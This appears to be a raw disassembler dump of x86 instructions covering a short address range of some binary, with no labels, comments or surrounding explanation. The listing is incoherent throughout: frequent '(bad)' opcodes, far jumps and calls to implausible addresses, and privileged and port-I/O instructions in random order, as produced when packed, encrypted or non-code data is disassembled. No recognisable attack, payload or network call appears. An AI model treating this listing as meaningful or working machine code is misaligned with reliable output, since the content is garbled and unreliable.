  4123a5:	lds    ebx,FWORD PTR [ecx+ecx*2-0x48543f23]
  4123ac:	aas    
  4123ad:	pop    ebx
  4123ae:	out    0x3,eax
  4123b0:	ds mov cl,0xbe
  4123b3:	mov    edx,0x56e75f7f
  4123b8:	mov    ch,0x3f
  4123ba:	imul   ecx,eax,0x79
  4123bd:	test   al,0x6a
  4123bf:	das    
  4123c0:	dec    esi
  4123c1:	pop    ebx
  4123c2:	mov    ah,0xf9
  4123c4:	jmp    0x3e450b22
  4123c9:	mov    al,0x20
  4123cb:	ret    0x0
	...
  4123f6:	dec    ebp
  4123f7:	pop    ebx
  4123f8:	es aas 
  4123fa:	test   BYTE PTR cs:[ecx],bh
  4123fd:	jns    0x412479
  4123ff:	imul   ebx,DWORD PTR [esi],0xffffffe7
  412402:	popf   
  412403:	loope  0x4123ad
  412405:	add    esi,DWORD PTR [edi+0x3e19f795]
  41240b:	push   eax
  41240c:	jne    0x4123c1
  41240e:	(bad)
  412412:	call   0xf7cd:0xbcaceeb4
  412419:	add    edx,DWORD PTR [ebx+0x5f]
  41241c:	push   ecx
  41241d:	add    esp,DWORD PTR [edi+esi*4-0x2a]
  412421:	ss ss inc ebx
  412424:	jae    0x41246f
  412426:	ror    DWORD PTR [edi-0x39],0x36
  41242a:	push   edx
  41242b:	push   eax
  41242c:	xor    eax,0x154c99fc
  412431:	lods   eax,DWORD PTR ds:[esi]
  412432:	test   al,0xe1
  412434:	and    al,0xb0
  412436:	mov    al,ds:0x12acfbc5
  41243b:	arpl   WORD PTR [edi-0x68b00d8c],cx
  412441:	lods   al,BYTE PTR ds:[esi]
  412442:	adc    ah,BYTE PTR [edi-0x72]
  412445:	ss ss inc ebx
  412448:	push   esp
  412449:	dec    esi
  41244a:	jns    0x41249b
  41244c:	jno    0x412494
  41244e:	jbe    0x41249f
  412450:	add    esp,edi
  412452:	push   ecx
  412453:	push   eax
  412454:	je     0x412437
  412456:	(bad)
  412459:	data16 add BYTE PTR [eax],al
	...
  412484:	stos   BYTE PTR es:[edi],al
  412485:	push   eax
  412486:	je     0x41247d
  412488:	mov    ds:0x7d4108c6,al
  41248d:	scas   al,BYTE PTR es:[edi]
  41248e:	std    
  41248f:	dec    esi
  412490:	(bad)  
  412491:	xchg   esi,eax
  412492:	adc    al,0x6a
  412494:	and    eax,0xbeed724f
  412499:	iret   
  41249a:	cld    
  41249b:	in     al,0x71
  41249d:	pusha  
  41249e:	sub    DWORD PTR [ecx+edx*8-0x9118ba9],0xff305e0e
  4124a9:	push   0x0
  4124ab:	dec    eax
  4124ac:	popa   
  4124ad:	fnstsw WORD PTR [edi]
  4124af:	jmp    0xac795ba0
  4124b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124b5:	enter  0xd205,0xfd
  4124b9:	lods   eax,DWORD PTR ds:[esi]
  4124ba:	(bad)  
  4124bb:	sub    edx,DWORD PTR [ecx+0x5b]
  4124be:	sub    DWORD PTR [ecx+edx*4+0x57],0xc7a4f773
  4124c6:	adc    al,0xde
  4124c8:	packsswb mm5,mm0
  4124cb:	add    DWORD PTR [edi+0x4e],esi
  4124ce:	(bad)  
  4124cf:	pusha  
  4124d0:	jg     0x4124f5
  4124d2:	imul   ebp,ecx,0xd1005c3d
  4124d8:	mov    esp,0x2bb6fdbc
  4124dd:	xchg   edi,eax
  4124de:	hlt    
  4124df:	add    dl,ch
  4124e1:	inc    ecx
  4124e2:	adc    esp,DWORD PTR [esi+0x14fd674f]
	...
  412510:	add    BYTE PTR [eax],al
  412512:	xchg   edx,eax
  412513:	ss xor al,0x34
  412516:	aad    0x4d
  412518:	mov    dh,BYTE PTR [esi+ecx*8]
  41251b:	jecxz  0x412521
  41251d:	add    ch,bh
  41251f:	cdq    
  412520:	cmp    DWORD PTR [ebp-0x41],edi
  412523:	test   edi,esp
  412525:	mov    ebx,DWORD PTR [edx]
  412527:	imul   eax,DWORD PTR [ecx+0xd8b5738],0xffffffff
  41252e:	jp     0x41252e
  412530:	in     eax,0x41
  412532:	test   DWORD PTR [ecx],eax
  412534:	jmp    FWORD PTR [ebx]
  412536:	pop    ss
  412537:	mov    ds:0x5a4bc2c7,al
  41253c:	cmp    DWORD PTR [ebp-0x7d],0xb8850d5c
  412543:	push   esi
  412544:	add    BYTE PTR [eax],al
  412546:	cmp    al,0x2
  412548:	jmp    0x4125b8
  41254a:	pushf  
  41254b:	lods   al,BYTE PTR ds:[esi]
  41254c:	hlt    
  41254d:	mov    ebp,DWORD PTR [ebx]
  41254f:	rol    BYTE PTR [edx],0x45
  412552:	aaa    
  412553:	ins    DWORD PTR es:[edi],dx
  412554:	add    BYTE PTR [eax+0x30],dl
  412557:	mov    WORD PTR [eax],cs
  412559:	call   0x3ec5ca
  41255e:	inc    eax
  41255f:	mov    WORD PTR [edi+edi*8],ss
  412562:	push   0x52
  412564:	out    0xb9,al
  412566:	rol    DWORD PTR [eax],cl
  412568:	dec    DWORD PTR [ecx+0x68059a]
  41256e:	loopne 0x4124fa
  412570:	adc    al,0xff
  412572:	push   0x4f
  412574:	out    0x49,al
	...
  41259e:	add    BYTE PTR [eax],al
  4125a0:	out    dx,eax
  4125a1:	add    bh,bh
  4125a3:	mov    esp,DWORD PTR [edx]
  4125a5:	imul   eax,DWORD PTR [ecx+0xd8aa739],0xffffffff
  4125ac:	push   0xb
  4125ae:	out    0xed,al
  4125b0:	test   BYTE PTR [ecx],0xff
  4125b3:	sub    edx,edi
  4125b5:	mov    al,ds:0x599bc2c7
  4125ba:	std    
  4125bb:	jne    0x4125fc
  4125bd:	add    dh,BYTE PTR [ebp+0x14]
  4125c0:	ds in  eax,0x30
  4125c3:	int3   
  4125c4:	and    DWORD PTR [esi-0x8],0x9a4bf3fe
  4125cb:	xchg   edx,eax
  4125cc:	jo     0x41259a
  4125ce:	stos   BYTE PTR es:[edi],al
  4125cf:	or     bh,BYTE PTR [esi+0x4e]
  4125d2:	sti    
  4125d3:	(bad)  
  4125d4:	jmp    0x41259d
  4125d6:	cdq    
  4125d7:	(bad)
  4125da:	stos   BYTE PTR es:[edi],al
  4125db:	sub    bh,BYTE PTR [esi+0xc]
  4125de:	mov    ebp,0x434432c1
  4125e3:	cmp    eax,ebx
  4125e5:	stos   DWORD PTR es:[edi],eax
  4125e6:	xor    ecx,DWORD PTR [ebp-0xf5efc7]
  4125ec:	stos   DWORD PTR es:[edi],eax
  4125ed:	es stos DWORD PTR es:[edi],eax
  4125ef:	je     0x4125e7
  4125f1:	test   DWORD PTR [eax],esi
  4125f3:	or     al,0x21
  4125f5:	or     dl,bh
  4125f7:	out    0xa0,eax
  4125f9:	je     0x4125a5
  4125fb:	inc    BYTE PTR [ebp-0x7e]
  4125fe:	cli    
  4125ff:	test   BYTE PTR [ebx+eax*2+0x2],ch
	...
  41262b:	add    BYTE PTR [eax],al
  41262d:	add    BYTE PTR [ecx],al
  41262f:	call   0xe4150de1
  412634:	stos   BYTE PTR es:[edi],al
  412635:	(bad)  
  412636:	and    eax,0xfcc94a82
  41263b:	cs add ch,cl
  41263e:	and    BYTE PTR [ebx+0x2],al
  412641:	add    BYTE PTR [ebp+0x410ca8b7],bh
  412647:	mov    bh,0xf0
  412649:	add    BYTE PTR [esi],bh
  41264b:	inc    edx
  41264c:	(bad)  
  41264e:	xlat   BYTE PTR ds:[ebx]
  41264f:	push   esi
  412650:	add    DWORD PTR [eax],eax
  412652:	ds leave 
  412654:	dec    ebp
  412655:	hlt    
  412656:	lds    esi,FWORD PTR [esi]
  412658:	ins    BYTE PTR es:[edi],dx
  412659:	add    al,BYTE PTR [ebx]
  41265b:	adc    bl,BYTE PTR [edi]
  41265d:	add    BYTE PTR [esi],cl
  41265f:	std    
  412660:	sub    eax,0xee5ba608
  412665:	dec    edx
  412666:	xchg   ecx,eax
  412667:	dec    esp
  412668:	adc    al,BYTE PTR [ecx+ecx*4]
  41266b:	(bad)  
  41266c:	sti    
  41266d:	test   al,0xa
  41266f:	arpl   WORD PTR [edi+0x65],di
  412672:	jo     0x4126c0
  412674:	xchg   DWORD PTR [ebp+0x2],edi
  412677:	addr16 push 0xffffffeb
  41267a:	imul   eax,edi,0x46eaa8e6
  412680:	add    BYTE PTR [ecx-0x21],0x4b
  412684:	fst    QWORD PTR [bx+di+0x30ac]
  412689:	(bad)  
  41268a:	sub    eax,0xcdd5e25b
  41268f:	push   ebp
  412690:	inc    eax
  412691:	cwde   
	...
  4126ba:	add    BYTE PTR [eax],al
  4126bc:	cmp    DWORD PTR [eax+ebp*8+0x7a],ecx
  4126c0:	jp     0x412701
  4126c2:	rol    BYTE PTR [ebx],cl
  4126c4:	sub    esi,eax
  4126c6:	fld    TBYTE PTR [eax+0x353f63aa]
  4126cc:	adc    DWORD PTR [edi+eiz*1+0x7d],ecx
  4126d0:	and    BYTE PTR [edi+0x6a],0xeb
  4126d4:	or     edi,eax
  4126d6:	out    0xa8,al
  4126d8:	mov    al,BYTE PTR [edi+0x0]
  4126db:	adc    DWORD PTR [edi+0x4c],ebx
  4126de:	pop    es
  4126df:	fnsave [ecx+0x4dc630ab]
  4126e5:	pop    ebx
  4126e6:	imul   dh
  4126e8:	pop    ebp
  4126e9:	(bad)  [eax-0x306a36fd]
  4126ef:	jl     0x41276b
  4126f1:	inc    ebx
  4126f2:	imul   ebx,DWORD PTR [ebx-0x137e5cb],0x14
  4126f9:	sub    DWORD PTR [ecx-0x17b44658],edx
  4126ff:	mov    al,0xae
  412701:	xlat   BYTE PTR ds:[ebx]
  412702:	iret   
  412703:	adc    BYTE PTR [edi-0x4536ff6b],dh
  412709:	mov    esi,0x971b0ae8
  41270e:	in     al,dx
  41270f:	loop   0x412761
  412711:	inc    ebx
  412712:	jbe    0x4126ff
  412714:	stos   BYTE PTR es:[edi],al
  412715:	sub    BYTE PTR [ecx],0xbb
  412718:	add    dl,BYTE PTR [edi+0x3b38c2ec]
  41271e:	mov    dh,BYTE PTR [eax+eax*1]
	...
  412749:	add    dl,dl
  41274b:	fdivr  DWORD PTR [edi+0x542c2ca]
  412751:	jle    0x4126ff
  412753:	pop    eax
  412754:	push   ebx
  412755:	mov    esp,edx
  412757:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412758:	in     al,0x72
  41275a:	adc    BYTE PTR [ebx+0x3a],al
  41275d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41275e:	test   eax,0x6203c8
  412763:	cmp    ebp,edx
  412765:	jmp    0x6f60:0x46e49fba
  41276c:	std    
  41276d:	mov    ah,0xd1
  41276f:	call   0x36a0:0x4325bcfd
  412776:	out    0x49,al
  412778:	or     ch,BYTE PTR [ecx]
  41277a:	pusha  
  41277b:	pop    edx
  41277c:	std    
  41277d:	xchg   esp,eax
  41277e:	fld    DWORD PTR [edx-0x64]
  412781:	mov    esi,edx
  412783:	dec    ecx
  412784:	sub    ch,BYTE PTR [ecx]
  412786:	xchg   BYTE PTR [ebx+eax*8],dl
  412789:	fnstsw WORD PTR ds:0x6a1d43d4
  41278f:	sbb    cl,BYTE PTR [esp+ebp*4-0x5b74650f]
  412796:	add    eax,0xc4d1529b
  41279b:	inc    ebp
  41279c:	(bad)  
  41279d:	fimul  WORD PTR [ebx-0x61]
  4127a0:	rcl    dh,1
  4127a2:	(bad)  
  4127a4:	jmp    0xfe8b317f
  4127a9:	add    BYTE PTR [esp+esi*2],ah
  4127ac:	rol    BYTE PTR [eax],1
	...
  4127d6:	add    BYTE PTR [eax],al
  4127d8:	jae    0x41282e
  4127da:	cmp    DWORD PTR [ebp-0x31],0xe817745f
  4127e1:	mov    esp,ss
  4127e3:	push   DWORD PTR [edx]
  4127e5:	pop    ss
  4127e6:	push   DWORD PTR [ebp-0x65]
  4127e9:	add    DWORD PTR [ebp+0x8],esi
  4127ec:	test   al,0xac
  4127ee:	sbb    bh,bh
  4127f0:	push   edx
  4127f1:	pop    ss
  4127f2:	out    0x2,al
  4127f4:	mov    esp,0x7c47ff02
  4127f9:	jae    0x4127f3
  4127fb:	pmullw mm5,QWORD PTR ds:0x1e8fffc
  412802:	jne    0x4127f8
  412804:	out    dx,eax
  412805:	popf   
  412806:	pusha  
  412807:	(bad)  
  412808:	call   0x574128c3
  41280d:	pop    esi
  41280e:	pop    ebp
  41280f:	leave  
  412810:	imul   eax,DWORD PTR gs:[eax],0x55
  412814:	lods   al,BYTE PTR ds:[esi]
  412815:	jecxz  0x41286d
  412817:	push   edx
  412819:	inc    ebp
  41281a:	out    0xd2,al
  41281c:	stc    
  41281d:	add    bh,bh
  41281f:	push   0x3f7b37
  412824:	pop    eax
  412825:	mov    WORD PTR [eax],cs
  412827:	call   0x41abbf
  41282c:	sbb    al,0x1e
  41282e:	jne    0x412835
  412830:	test   al,0x6
  412832:	ror    BYTE PTR [eax],0xe7
  412835:	pop    es
  412836:	(bad)  
  412837:	(bad)  
  412838:	call   0x12930c7
	...
  412865:	add    BYTE PTR [esi],ah
  412867:	jno    0x412866
  412869:	jmp    FWORD PTR [eax]
  41286b:	sub    eax,0xe74162
  412870:	jne    0x41287a
  412872:	adc    bh,ah
  412874:	jae    0x4128c1
  412876:	ds xor al,0x2
  412879:	or     edi,DWORD PTR [esi-0x52]
  41287c:	call   FWORD PTR [esi-0x79]
  41287f:	cmc    
  412880:	stc    
  412881:	jmp    DWORD PTR [ebp-0x5e473dbc]
  412887:	adc    BYTE PTR [edi-0x16367302],ah
  41288d:	push   es
  41288e:	or     edx,esp
  412890:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412891:	je     0x4128c9
  412893:	in     al,dx
  412894:	jo     0x4128df
  412896:	ds xor al,0xfb
  412899:	mov    edi,0xc9473ef3
  41289e:	jl     0x4128eb
  4128a0:	add    ch,BYTE PTR [eax+0x3c]
  4128a3:	pop    edi
  4128a4:	inc    ebx
  4128a5:	add    BYTE PTR [ecx+0x46],ah
  4128a8:	cli    
  4128a9:	out    0xff,eax
  4128ab:	jl     0x4128b1
  4128ad:	add    BYTE PTR [ebp+0x74],al
  4128b0:	xor    BYTE PTR [ecx],cl
  4128b2:	dec    ecx
  4128b3:	test   BYTE PTR cs:[esi+0x4074203b],0x3e
  4128bb:	sbb    bh,cl
  4128bd:	fs jg  0x4128f2
  4128c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128c1:	je     0x4128f9
  4128c3:	stos   BYTE PTR es:[edi],al
  4128c4:	fimul  WORD PTR [edx+0x3e]
  4128c7:	xor    bh,bl
  4128c9:	mov    edi,0x0
	...
  4128f2:	add    BYTE PTR [eax],al
  4128f4:	xchg   ebx,eax
  4128f5:	cmp    esp,DWORD PTR [edi+0xd14274]
  4128fb:	jo     0x4128b5
  4128fd:	repz add DWORD PTR [eax+0x22],ebp
  412901:	xlat   BYTE PTR ds:[ebx]
  412902:	inc    esp
  412903:	add    cl,bh
  412905:	out    dx,eax
  412906:	stc    
  412907:	out    0x43,eax
  412909:	or     eax,0x72350002
  41290e:	xor    BYTE PTR [ecx],cl
  412910:	loope  0x4128d9
  412912:	cmc    
  412913:	mov    es,WORD PTR [ebx-0x32]
  412916:	jae    0x412958
  412918:	ds pop ebx
  41291a:	lahf   
  41291b:	add    edi,DWORD PTR [esi]
  41291d:	pop    ebx
  41291e:	out    0x44,eax
  412920:	neg    DWORD PTR ds:0xd41303e0
  412926:	mov    ebx,0x1e4f7d81
  41292b:	dec    ebp
  41292c:	push   ss
  41292d:	pop    ss
  41292e:	inc    esp
  41292f:	inc    ebx
  412930:	ds dec eax
  412932:	cmp    eax,0x2326a1fc
  412937:	add    al,0x3e
  412939:	push   esp
  41293a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41293b:	das    
  41293c:	inc    eax
  41293d:	test   al,0x3d
  41293f:	mov    ebx,0x43e75f7f
  412944:	lds    ecx,FWORD PTR [ebx+0x63]
  412947:	daa    
  412948:	inc    esi
  412949:	xor    al,0xe9
  41294b:	pop    edi
  41294c:	jmp    0x647010d9
  412951:	(bad)  
  412952:	push   DWORD PTR [ebp-0x5b186623]
	...
  412980:	add    BYTE PTR [eax],al
  412982:	retf   0x4f52
  412985:	ins    DWORD PTR es:[edi],dx
  412986:	hlt    
  412987:	pop    edx
  412988:	out    0xf8,eax
  41298a:	or     esi,0x129844ed
  412990:	sub    al,BYTE PTR [eax]
  412992:	ds aam 0xc4
  412995:	sti    
  412996:	adc    al,0x7d
  412998:	addr16 in eax,0x36
  41299b:	iret   
  41299c:	rol    BYTE PTR [ebx+0xfb35658],1
  4129a2:	mov    esi,0x392ff187
  4129a7:	fcmovnu st,st(6)
  4129a9:	dec    eax
  4129aa:	mov    dl,BYTE PTR [ebp+0x67]
  4129ad:	in     eax,0x9a
  4129af:	iret   
  4129b0:	in     al,0x83
  4129b2:	xor    BYTE PTR [ebx+0x6000007c],bh
  4129b8:	(bad)  
  4129b9:	cmp    al,0xbe
  4129bb:	xchg   DWORD PTR [eax],eax
  4129bd:	jmp    0xa5074bea
  4129c2:	cdq    
  4129c3:	inc    edi
  4129c4:	(bad)  
  4129c5:	jmp    0xe1854a07
  4129ca:	cmp    eax,0x36e9005b
  4129cf:	(bad)  
  4129d0:	or     dl,al
  4129d2:	jbe    0x4129af
  4129d4:	cmp    eax,0x8174590e
  4129d9:	cmp    al,0xd6
  4129db:	inc    edi
  4129dc:	jne    0x4129b9
  4129de:	jmp    0x5b:0x3de8f89e
  4129e5:	sbb    al,0x0
	...
  412a0f:	add    BYTE PTR [esi],dh
  412a11:	and    BYTE PTR [ebp+ebx*4+0x3c],al
  412a15:	pop    ebx
  412a16:	add    cl,ch
  412a18:	(bad)  
  412a19:	ins    BYTE PTR es:[edi],dx
  412a1a:	cmc    
  412a1b:	and    al,0xa2
  412a1d:	pop    edx
  412a1e:	add    cl,ch
  412a20:	cmp    eax,0x62a70ace
  412a25:	lds    ebp,FWORD PTR [si]
  412a28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a29:	inc    edi
  412a2a:	(bad)  
  412a2b:	jmp    0xc57f056d
  412a30:	sbb    BYTE PTR [esi-0x3],bl
  412a33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a34:	xchg   ebp,eax
  412a35:	xor    al,0x6
  412a37:	cs js  0x412a7d
  412a3a:	add    ecx,ebp
  412a3c:	cmp    eax,0xe1c4815b
  412a41:	pop    ebx
  412a42:	jae    0x412a2e
  412a44:	jecxz  0x412aa3
  412a46:	and    BYTE PTR [esi-0x4bff7a43],ch
  412a4c:	(bad)  
  412a4d:	sar    DWORD PTR [ebx-0xf],1
  412a50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a51:	bound  eax,QWORD PTR [eax+0x16d01dde]
  412a57:	imul   esp,DWORD PTR [edx],0x4d94205c
  412a5d:	scas   al,BYTE PTR es:[edi]
  412a5e:	jmp    0x47060363
  412a63:	add    DWORD PTR [edi+0x47],ebp
  412a66:	inc    edi
  412a67:	adc    BYTE PTR [eax-0x3f0a8ca6],0x8f
  412a6e:	inc    ebp
  412a6f:	and    BYTE PTR [eax],0x5f
  412a72:	jae    0x412a53
	...
  412a9c:	add    BYTE PTR [eax],al
  412a9e:	cwde   
  412a9f:	xchg   esp,eax
  412aa0:	hlt    
  412aa1:	add    BYTE PTR [edi+0xa8b005a],ah
  412aa7:	push   edi
  412aa8:	mov    DWORD PTR [ebp-0x51],edi
  412aab:	cmc    
  412aac:	pop    ds
  412aad:	and    BYTE PTR [eax-0x16e38aca],0x52
  412ab4:	add    bh,bh
  412ab6:	dec    edx
  412ab7:	jecxz  0x412b0c
  412ab9:	call   0x40272a
  412abe:	mov    WORD PTR [edx],ds
  412ac0:	jne    0x412ac8
  412ac2:	xor    BYTE PTR [ecx+0x5a5bc2c7],bl
  412ac8:	mov    edi,esi
  412aca:	sbb    edx,edi
  412acc:	inc    esp
  412acd:	hlt    
  412ace:	sbb    bh,bl
  412ad0:	add    BYTE PTR ds:[edx+0x7],bl
  412ad4:	push   DWORD PTR [ebp-0x35]
  412ad7:	sub    al,0xc
  412ada:	loope  0x412ad5
  412adc:	(bad)  
  412add:	pop    edi
  412ade:	adc    DWORD PTR [edi],0x832704c0
  412ae4:	mov    esp,ebp
  412ae6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ae7:	adc    eax,esi
  412ae9:	push   esi
  412aea:	enter  0x7cdc,0x14
  412aee:	pop    ss
  412aef:	outs   dx,BYTE PTR ds:[esi]
  412af0:	pop    es
  412af1:	adc    DWORD PTR [edx],0xffffffde
  412af4:	dec    edx
  412af5:	inc    ecx
  412af6:	daa    
  412af7:	pop    edx
  412af8:	jae    0x412b00
  412afa:	add    BYTE PTR [edi+eax*8-0x76a5f83e],bl
  412b01:	inc    ebp
	...
  412b2a:	add    BYTE PTR [eax],al
  412b2c:	ds dec eax
  412b2e:	fld    QWORD PTR [edx+eiz*2]
  412b31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b32:	inc    ebx
  412b33:	add    BYTE PTR [ecx],bh
  412b35:	mov    cl,0x65
  412b37:	add    BYTE PTR [esi],bh
  412b39:	xor    al,0xdd
  412b3b:	add    al,0x4e
  412b3d:	mov    esi,0xb1410043
  412b42:	jns    0x412b44
  412b44:	ds xor al,0xdd
  412b47:	add    al,0x4a
  412b49:	mov    dh,0x44
  412b4b:	add    BYTE PTR [ecx-0x4f],cl
  412b4e:	mov    es,WORD PTR [eax]
  412b50:	ds xor al,0x91
  412b53:	inc    esp
  412b54:	mov    dl,0x63
  412b56:	pop    DWORD PTR [esi+eiz*4+0x63]
  412b5a:	pop    DWORD PTR [edx+ebx*4+0x63]
  412b5e:	mov    eax,ds:0x44a62234
  412b63:	add    BYTE PTR [ecx-0x3f180b9a],cl
  412b69:	sti    
  412b6a:	mov    ds:0xac76cbfe,al
  412b6f:	dec    edi
  412b70:	ret    
  412b71:	jle    0x412b23
  412b73:	dec    edi
  412b74:	mov    ebx,0x614f9476
  412b79:	push   cs
  412b7a:	push   ss
  412b7b:	mov    ?,edi
  412b7d:	xor    esp,DWORD PTR [ebx+0x65dc2e74]
  412b83:	test   DWORD PTR [ecx-0x44],0x3624490
  412b8a:	xchg   ecx,eax
  412b8b:	inc    esp
  412b8c:	push   ds
  412b8d:	add    edx,DWORD PTR [ecx+0x44]
	...
  412bb7:	add    BYTE PTR [eax],al
  412bb9:	add    BYTE PTR [edx],bl
  412bbb:	add    esp,DWORD PTR [ebx+0x44ccae34]
  412bc1:	add    BYTE PTR [ecx],ah
  412bc3:	adc    dl,dh
  412bc5:	out    0xc4,eax
  412bc7:	mov    ah,BYTE PTR [edx-0x59efee02]
  412bcd:	mov    es,WORD PTR [ebx-0x755dc4a5]
  412bd3:	daa    
  412bd4:	outs   dx,DWORD PTR ds:[esi]
  412bd5:	dec    eax
  412bd6:	push   ss
  412bd7:	sbb    eax,0x44f1b3ad
  412bdc:	call   0x33dfe6e4
  412be1:	xor    edx,DWORD PTR [edx+ebx*2-0x6f]
  412be5:	add    esp,DWORD PTR [ebx+ebx*2-0x7f]
  412be9:	add    esp,DWORD PTR [ebx+ebx*2+0x5c]
  412bed:	dec    eax
  412bee:	repnz stos DWORD PTR es:[edi],eax
  412bf0:	out    0xf7,al
  412bf2:	mov    ebp,0x45042890
  412bf7:	sbb    esp,edi
  412bf9:	xchg   DWORD PTR [edi+0x5a],eax
  412bfc:	out    0x3,eax
  412bfe:	mov    ebp,0x310497c6
  412c03:	(bad)  
  412c05:	add    bh,BYTE PTR [esi]
  412c07:	pop    ebx
  412c08:	bound  ecx,QWORD PTR [edi-0x7e]
  412c0b:	sbb    BYTE PTR [eax+ebp*4],0x38
  412c0f:	fcomp  QWORD PTR [ebx-0x64a4c1fc]
  412c15:	(bad)  
  412c16:	repnz sub ah,BYTE PTR [ebx+0x1f]
  412c1a:	xchg   edx,eax
  412c1b:	rcr    BYTE PTR [eax+edx*8],1
	...
  412c46:	add    BYTE PTR [eax],al
  412c48:	pop    esp
  412c49:	pop    ecx
  412c4a:	jp     0x412cb4
  412c4c:	pusha  
  412c4d:	into   
  412c4e:	stos   DWORD PTR es:[edi],eax
  412c4f:	xchg   ecx,eax
  412c50:	add    bh,BYTE PTR [edi]
  412c52:	ja     0x412c6b
  412c54:	outs   dx,BYTE PTR ds:[esi]
  412c55:	xor    edi,DWORD PTR [eax+0x6a5b3e4b]
  412c5b:	pop    ds
  412c5c:	inc    edx
  412c5d:	pop    ebx
  412c5e:	out    dx,al
  412c5f:	xchg   DWORD PTR [ebx],ecx
  412c61:	pop    ebx
  412c62:	out    0x3,eax
  412c64:	mov    ebp,0x390457c5
  412c69:	fild   QWORD PTR [ebx]
  412c6b:	add    al,0x3e
  412c6d:	pop    ebx
  412c6e:	push   0x1f
  412c70:	and    bl,BYTE PTR [ebx+0x0]
  412c73:	out    0xb9,al
  412c75:	add    DWORD PTR [ecx],eax
  412c77:	jmp    0x25b570b9
  412c7c:	rol    BYTE PTR [edx-0x2d60e1a5],cl
  412c82:	inc    ebx
  412c83:	and    DWORD PTR [edi+0x510efcce],ebx
  412c89:	adc    edi,esi
  412c8b:	jl     0x412c56
  412c8d:	cmp    ebx,DWORD PTR [esi-0x64]
  412c90:	sahf   
  412c91:	inc    esp
  412c92:	imul   eax,edx,0x1009a18
  412c98:	mov    DWORD PTR [eax+eax*1+0x29b30de9],ebx
  412c9f:	inc    esp
  412ca0:	std    
  412ca1:	pop    edx
  412ca2:	std    
  412ca3:	pop    esp
  412ca4:	cmp    BYTE PTR [ebx],0x84
  412ca7:	and    BYTE PTR [edx+0x5b],al
  412caa:	or     DWORD PTR [ecx+0x0],ebp
	...
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	dec    ecx
  412cd7:	arpl   WORD PTR [eax-0x5],bp
  412cda:	pusha  
  412cdb:	call   0xe900:0x9c7cc100
  412ce2:	dec    ebp
  412ce3:	mov    bl,0x32
  412ce5:	or     al,0xfd
  412ce7:	pop    edx
  412ce8:	std    
  412ce9:	adc    al,0x8a
  412ceb:	cmp    ebp,DWORD PTR [eax+0x20]
  412cee:	cmp    bl,BYTE PTR [ebx+0x9]
  412cf1:	test   eax,0xc3686351
  412cf6:	sbb    BYTE PTR [edx-0x631f6f00],bl
  412cfc:	add    cl,ch
  412cfe:	or     eax,0xfd043ab3
  412d03:	pop    edx
  412d04:	std    
  412d05:	fdiv   QWORD PTR [ebp+0x3b]
  412d08:	dec    esp
  412d09:	mov    al,0x3d
  412d0b:	pop    ebx
  412d0c:	or     DWORD PTR [ecx],ebp
  412d0e:	dec    eax
  412d0f:	cwde   
  412d10:	push   0xbf323de9
  412d15:	add    BYTE PTR [eax+0x69],bh
  412d18:	or     al,0xe8
  412d1a:	push   es
  412d1b:	xchg   ch,bh
  412d1d:	dec    DWORD PTR [eax+0x29]
  412d20:	mov    ss,si
  412d23:	pop    esi
  412d24:	std    
  412d25:	jne    0x412d32
  412d27:	not    DWORD PTR [edx+0x59]
  412d2a:	pop    eax
  412d2b:	sti    
  412d2c:	(bad)  
  412d2d:	jne    0x412d7a
  412d2f:	sti    
  412d30:	je     0x412d26
  412d32:	cmp    BYTE PTR [ecx+0xc],ch
  412d35:	call   0x3eb2f6
	...
  412d62:	add    BYTE PTR [eax],al
  412d64:	fsubr  DWORD PTR [eax-0x10]
  412d67:	call   DWORD PTR [edx-0xa]
  412d6a:	(bad)  
  412d6b:	jne    0x412d58
  412d6d:	imul   BYTE PTR [ecx+ebx*2-0x28]
  412d71:	loop   0x412d71
  412d73:	jne    0x412cf8
  412d75:	loop   0x412deb
  412d77:	fmul   QWORD PTR [eax+0x58e80c64]
  412d7d:	cmp    ch,0xff
  412d80:	js     0x412de6
  412d82:	enter  0x57e8,0x9b
  412d86:	std    
  412d87:	jmp    FWORD PTR [eax]
  412d89:	add    edi,0x535e67c2
  412d8f:	mov    ebp,DWORD PTR [ebx-0x1b173e22]
  412d95:	jnp    0x412dab
  412d97:	add    eax,0x112d358
  412d9c:	push   edi
  412d9d:	pop    esi
  412d9e:	mov    eax,DWORD PTR [ebp-0x1d]
  412da1:	xchg   BYTE PTR [ebx-0x747840bb],cl
  412da7:	inc    ebp
  412da8:	retf   
  412da9:	xchg   BYTE PTR [edx+0x2],ch
  412dac:	fsub   DWORD PTR [ebx+0x10]
  412daf:	call   0x4017ea
  412db4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412db5:	jl     0x412daf
  412db7:	add    DWORD PTR [esi],edi
  412db9:	cmp    DWORD PTR [ecx+0x2343ef2],ecx
  412dbf:	jmp    FWORD PTR [ebx+0xe448d80]
  412dc5:	sub    al,0x9b
  412dc7:	arpl   WORD PTR [eax],ax
	...
  412df1:	add    BYTE PTR [edi+0x34],bh
  412df4:	lahf   
  412df5:	je     0x412e05
  412df7:	pushf  
  412df8:	jge    0x412e40
  412dfa:	ds xor al,0xb
  412dfd:	ror    BYTE PTR [ecx-0x49],0xbc
  412e01:	push   ecx
  412e03:	xor    edx,DWORD PTR [ecx-0x6efc0dbc]
  412e09:	inc    esp
  412e0a:	out    0xe3,al
  412e0c:	nop
  412e0d:	inc    esp
  412e0e:	(bad)  
  412e10:	daa    
  412e11:	add    cl,dl
  412e13:	mov    esi,0x49e0e7f1
  412e18:	lahf   
  412e19:	(bad)  
  412e1a:	mov    ebp,0x49009cb6
  412e1f:	mov    bh,0x59
  412e21:	push   DWORD PTR [ecx-0x4d8b60cd]
  412e27:	fwait
  412e28:	(bad)  
  412e29:	arpl   di,di
  412e2b:	xor    ebp,DWORD PTR [edx+0x2340145]
  412e31:	or     edi,DWORD PTR [esi+0x38]
  412e34:	mov    DWORD PTR [edx-0x72fdcbc2],esp
  412e3a:	sti    
